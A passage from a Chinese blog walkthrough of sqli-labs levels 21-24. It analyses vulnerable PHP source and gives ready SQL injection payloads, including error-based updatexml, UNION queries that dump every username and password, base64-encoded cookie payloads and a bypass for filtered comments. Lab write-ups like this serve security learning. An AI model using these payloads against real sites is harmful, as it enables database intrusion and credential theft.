<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='高级注入姿势 21-37 关 Less-21(Cookie Base64编码注入) 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username=(&#39;$cookee&#39;) 简单源码分析：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &amp;lt;?php if cookie 中不存在 uname 参数: 输出了一堆无用的信息 if 提交了 uname 和 passwd: # 进行过滤 $uname = check_input($_POST[&amp;#39;uname&amp;#39;]); $passwd = check_input($_POST[&amp;#39;passwd&amp;#39;]); $sql=&amp;#34;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.'>
<title>SQLI labs 靶场笔记之高级注入姿势 21-37 关</title>

<link rel='canonical' href='https://360rce.github.io/p/ojwgoapt/'>

<link rel="stylesheet" href="/scss/style.min.efe1e773d779dbe0d478a3345bc5ad949fed81363c53bfa8984135f20bf7841d.css"><meta property='og:title' content='SQLI labs 靶场笔记之高级注入姿势 21-37 关'>
<meta property='og:description' content='高级注入姿势 21-37 关 Less-21(Cookie Base64编码注入) 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username=(&#39;$cookee&#39;) 简单源码分析：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &amp;lt;?php if cookie 中不存在 uname 参数: 输出了一堆无用的信息 if 提交了 uname 和 passwd: # 进行过滤 $uname = check_input($_POST[&amp;#39;uname&amp;#39;]); $passwd = check_input($_POST[&amp;#39;passwd&amp;#39;]); $sql=&amp;#34;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.'>
<meta property='og:url' content='https://360rce.github.io/p/ojwgoapt/'>
<meta property='og:site_name' content='iceH&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='SQL注入' /><meta property='article:tag' content='sqlilab' /><meta property='article:published_time' content='2020-07-21T13:20:26&#43;00:00'/><meta property='article:modified_time' content='2020-07-21T13:20:26&#43;00:00'/><meta property='og:image' content='https://w.wallhaven.cc/full/1p/wallhaven-1p28eg.jpg' />
<meta name="twitter:title" content="SQLI labs 靶场笔记之高级注入姿势 21-37 关">
<meta name="twitter:description" content="高级注入姿势 21-37 关 Less-21(Cookie Base64编码注入) 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username=(&#39;$cookee&#39;) 简单源码分析：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &amp;lt;?php if cookie 中不存在 uname 参数: 输出了一堆无用的信息 if 提交了 uname 和 passwd: # 进行过滤 $uname = check_input($_POST[&amp;#39;uname&amp;#39;]); $passwd = check_input($_POST[&amp;#39;passwd&amp;#39;]); $sql=&amp;#34;SELECT users.username, users.password FROM users WHERE users.username=$uname and users."><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://w.wallhaven.cc/full/1p/wallhaven-1p28eg.jpg' />
    <link rel="shortcut icon" href="/favicon.ico" />
<style>
    :root {
     
    --sys-font-family: "HarmonyOS_Sans_SC_Medium", Georgia, -apple-system, 'Nimbus Roman No9 L', 'PingFang SC', 'Hiragino Sans GB', 'Noto Serif SC', 'Microsoft Yahei', 'WenQuanYi Micro Hei', 'ST Heiti', sans-serif;
    --code-font-family: "JetBrainsMono Regular", Menlo, Monaco, Consolas, "Courier New";
    --article-font-family: "HarmonyOS_Sans_SC_Medium", var(--base-font-family);
  }
</style>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://npm.elemecdn.com/irithys-cdn@1.0.4/font/font.css";
        customFont.type = "text/css";
        customFont.rel = "stylesheet";
         document.head.appendChild(customFont);
}());
</script>
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended">


        <div id="article-toolbar" style="position: sticky;top: 5px;z-index: 1000;">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>返回</span>
            </a>
        </div>
    

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M512 256C512 397.4 397.4 512 256 512C114.6 512 0 397.4 0 256C0 114.6 114.6 0 256 0C397.4 0 512 114.6 512 256zM176 168V344C176 352.7 180.7 360.7 188.3 364.9C195.8 369.2 205.1 369 212.5 364.5L356.5 276.5C363.6 272.1 368 264.4 368 256C368 247.6 363.6 239.9 356.5 235.5L212.5 147.5C205.1 142.1 195.8 142.8 188.3 147.1C180.7 151.3 176 159.3 176 168V168z"></path></svg>
            
        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#less-21cookie-base64编码注入">Less-21(Cookie Base64编码注入)</a></li>
    <li><a href="#less-22">Less-22</a></li>
    <li><a href="#less-23过滤--注释">Less-23(过滤#、&ndash;注释)</a></li>
    <li><a href="#less-24二次注入">Less-24(二次注入)</a>
      <ol>
        <li><a href="#代码分析">代码分析</a></li>
        <li><a href="#思路分析">思路分析</a></li>
        <li><a href="#步骤演示">步骤演示</a></li>
      </ol>
    </li>
    <li><a href="#less-25过滤or和and">Less-25(过滤or和and)</a>
      <ol>
        <li><a href="#关键代码分析">关键代码分析：</a></li>
        <li><a href="#测试阶段">测试阶段</a></li>
        <li><a href="#爆数据库名">爆数据库名</a></li>
        <li><a href="#爆破表名">爆破表名</a></li>
        <li><a href="#爆破出数据">爆破出数据</a></li>
      </ol>
    </li>
    <li><a href="#less-25a">Less-25a</a></li>
    <li><a href="#less-26过滤orand注释空格和斜线">Less-26(过滤or、and、/*、注释、空格和斜线)</a>
      <ol>
        <li><a href="#爆库">爆库</a></li>
        <li><a href="#爆表名">爆表名</a></li>
        <li><a href="#爆破列名">爆破列名</a></li>
        <li><a href="#爆数据">爆数据</a></li>
      </ol>
    </li>
    <li><a href="#less-26a">Less-26a</a></li>
    <li><a href="#less-27过滤了很多">Less-27(过滤了很多)</a>
      <ol>
        <li><a href="#判断注入点">判断注入点</a></li>
        <li><a href="#判断数据库名">判断数据库名</a></li>
        <li><a href="#判断表名">判断表名</a></li>
        <li><a href="#判断列名">判断列名</a></li>
        <li><a href="#得到数据">得到数据</a></li>
      </ol>
    </li>
    <li><a href="#less-27a">Less-27a</a></li>
    <li><a href="#less-28">Less-28</a></li>
    <li><a href="#less-28a">Less-28a</a></li>
    <li><a href="#less-29">Less-29</a></li>
    <li><a href="#less-30">Less-30</a></li>
    <li><a href="#less-31">Less-31</a></li>
    <li><a href="#less-32宽字节注入">Less-32(宽字节注入)</a></li>
    <li><a href="#less-33">Less-33</a></li>
    <li><a href="#less-34">Less-34</a></li>
    <li><a href="#less-35">Less-35</a></li>
    <li><a href="#less-36bypass-mysql_real_escape_string">Less-36(Bypass mysql_real_escape_string)</a></li>
    <li><a href="#less-37">Less-37</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/ojwgoapt/">
                
                    <img src="https://w.wallhaven.cc/full/1p/wallhaven-1p28eg.jpg" loading="lazy" alt="Featured image of post SQLI labs 靶场笔记之高级注入姿势 21-37 关" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E5%90%B9%E6%A2%A6%E5%88%B0%E8%A5%BF%E5%B7%9E/" >
                吹梦到西州
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/ojwgoapt/">SQLI labs 靶场笔记之高级注入姿势 21-37 关</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M326.1 160l127.4-127.4C451.7 32.39 449.9 32 448 32h-86.06l-128 128H326.1zM166.1 160l128-128H201.9l-128 128H166.1zM497.7 56.19L393.9 160H512V96C512 80.87 506.5 67.15 497.7 56.19zM134.1 32H64C28.65 32 0 60.65 0 96v64h6.062L134.1 32zM0 416c0 35.35 28.65 64 64 64h384c35.35 0 64-28.65 64-64V192H0V416z"></path></svg>
                
                <time class="article-time--published">2020/07/21</time>
            </div>
        

        
            <div>
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M256 512C114.6 512 0 397.4 0 256S114.6 0 256 0S512 114.6 512 256s-114.6 256-256 256zM232 120V256c0 8 4 15.5 10.7 20l96 64c11 7.4 25.9 4.4 33.3-6.7s4.4-25.9-6.7-33.3L280 243.2V120c0-13.3-10.7-24-24-24s-24 10.7-24 24z"></path></svg>
                
                <time class="article-time--reading">
                    阅读时长: 13 分钟
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="高级注入姿势-21-37-关">高级注入姿势 21-37 关</h1>
<h2 id="less-21cookie-base64编码注入">Less-21(Cookie Base64编码注入)</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>username=('$cookee')</code></td>
</tr>
</tbody>
</table></div>
<p><strong>简单源码分析</strong>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">cookie</span> <span class="nx">中不存在</span> <span class="nx">uname</span> <span class="nx">参数</span><span class="o">:</span>  
</span></span><span class="line"><span class="cl">    <span class="nx">输出了一堆无用的信息</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">提交了</span> <span class="nx">uname</span> <span class="nx">和</span> <span class="nx">passwd</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 进行过滤
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$uname</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$passwd</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT  users.username, users.password FROM users WHERE users.username=</span><span class="si">$uname</span><span class="s2"> and users.password=</span><span class="si">$passwd</span><span class="s2"> ORDER BY users.id DESC LIMIT 0,1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">有查询结果</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># 将 uname 的值设置给 cookie 里面的 uname 参数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;uname&#39;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$row1</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]),</span> <span class="nx">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">);</span>    
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">POST</span> <span class="nx">数据里面没有</span> <span class="nx">submit</span> <span class="nx">参数</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                 <span class="c1"># 对 cookee 进行 base64 解密
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$cookee</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$cookee</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># 直接将 cookee 通过单引号拼接到 SQL 语句中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE username=&#39;</span><span class="si">$cookee</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">查询无结果</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nx">输出</span> <span class="nx">mysql_error</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">有结果</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nx">输出查询的信息</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 将 uname 的值设置给 cookie 里面的 uname 参数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;uname&#39;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$row1</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]),</span> <span class="nx">time</span><span class="p">()</span><span class="o">-</span><span class="mi">3600</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>从源码中分析可得，和 Less-20 基本上是一毛一样，只是 Coojie 这里是经过 base64 加密的，所以我们只需要传入加密后的 payload 给 cookie 的 uname 即可，下面就只用报错注入来简单演示一下吧：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/Less-21/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">sqli.pl</span>
</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://sqli.pl/Less-21/</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VybmFtZSBmcm9tIHVzZXJzIGxpbWl0IDEsMSksMHg3ZSksMSkj</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Cookie 的 uname 参数 Base64 解码为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">admin</span><span class="s1">&#39;) and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1)#
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>联合注入</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="k">admin</span><span class="s1">&#39;) union select 1,2,(select group_concat(username,&#39;</span><span class="p">:</span><span class="s1">&#39;,password) from users) #
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="less-22">Less-22</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>username=&quot;$cookee&quot;</code></td>
</tr>
</tbody>
</table></div>
<p><strong>简单源码分析</strong>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># 先双引号 然后直接拼接到SQL语句中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$cookee1</span> <span class="o">=</span> <span class="s1">&#39;&#34;&#39;</span><span class="o">.</span> <span class="nv">$cookee</span><span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>    
</span></span><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE username=</span><span class="si">$cookee1</span><span class="s2"> LIMIT 0,1&#34;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以发现和 Less-21 相比，只是拼接方式不一样，其他都是一致的，这里就不再啰嗦了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/Less-22/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">sqli.pl</span>
</span></span><span class="line"><span class="cl"><span class="n">Pragma</span><span class="o">:</span> <span class="l">no-cache</span>
</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://sqli.pl/Less-22/</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLChzZWxlY3QgZ3JvdXBfY29uY2F0KHVzZXJuYW1lLCc6JyxwYXNzd29yZCkgZnJvbSB1c2VycykgIw==</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Cookie 的 uname 参数 Base64 解码为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="k">admin</span><span class="s2">&#34; union select 1,2,(select group_concat(username,&#39;:&#39;,password) from users) #
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="less-23过滤--注释">Less-23(过滤#、&ndash;注释)</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id='$id'</code></td>
</tr>
</tbody>
</table></div>
<p><strong>简单源码分析</strong>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># 获取到 id 的值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 过滤了 id 中的 # 和 -- 然后 替换为 空
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$reg</span> <span class="o">=</span> <span class="s2">&#34;/#/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$reg1</span> <span class="o">=</span> <span class="s2">&#34;/--/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$replace</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$reg</span><span class="p">,</span> <span class="nv">$replace</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$reg1</span><span class="p">,</span> <span class="nv">$replace</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 使用单引号拼接 SQL
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">有查询结果</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nx">输出查询信息</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>过滤了注释符号</strong>，但是这里还可以考虑使用闭合方式来进行注入，下面直接使用最简单的联合查询注入吧：</p>
<p>Payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,(select group_concat(username,&#39;</span><span class="p">:</span><span class="s1">&#39;,password+SEPARATOR+0x3c62723e) from users),3 and &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="less-24二次注入">Less-24(二次注入)</h2>
<p>一个经典的二次注入场景，所以下面来单个理一下源码。</p>
<h3 id="代码分析">代码分析</h3>
<ul>
<li><code>index.php</code></li>
</ul>
<p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，具体的界面如下：</p>
<p><img src="/p/ojwgoapt/01.png"
	width="557"
	height="315"
	srcset="/p/ojwgoapt/01_hu4967e95e3a1f9c5fb4e4e1ce4b01493c_6718_480x0_resize_box_3.png 480w, /p/ojwgoapt/01_hu4967e95e3a1f9c5fb4e4e1ce4b01493c_6718_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-24(二次注入)"
	
	
		class="gallery-image" 
		data-flex-grow="176"
		data-flex-basis="424px"
	
></p>
<p>提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。</p>
<p><code>忘记密码</code>：左下角的忘记密码选项提示：如果你忘记密码 请 hack it</p>
<p><code>新建用户</code>：右下角新建用户可以新建一个自己的用户</p>
<ul>
<li><code>failed.php</code></li>
</ul>
<p>检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php</p>
<ul>
<li><code>forgot_password.php</code></li>
</ul>
<p>简单提示：如果你忘记密码 请 hack it</p>
<ul>
<li><code>Logged-in.php</code></li>
</ul>
<p>登录后的信息展示，显示登录名称并且提供了修改密码的表单</p>
<ul>
<li><code>new_user.php</code></li>
</ul>
<p>创建新用户的表单页面，本文件主要存放前段代码。</p>
<ul>
<li><code>login_create.php</code></li>
</ul>
<p>创建新用户的后端代码，下面来简单理一下代码的流程：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
